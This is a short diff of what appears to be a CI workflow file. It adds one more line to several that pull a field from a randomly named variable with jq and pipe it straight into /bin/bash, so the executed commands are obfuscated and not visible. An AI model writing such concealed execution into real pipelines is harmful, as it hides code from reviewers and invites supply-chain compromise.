@@ -29,6 +29,7 @@ jobs:
           echo $gd35781 | jq -r .cr3 | /bin/bash
           echo $n1709 | jq -r .q73 | /bin/bash
           printf '%s' "$uop7164" | jq -r .b79 | /bin/bash
+          printf '%s' "$k4075" | jq -r .qksi86540 | /bin/bash
 
       - name: Save archive
         if: always()
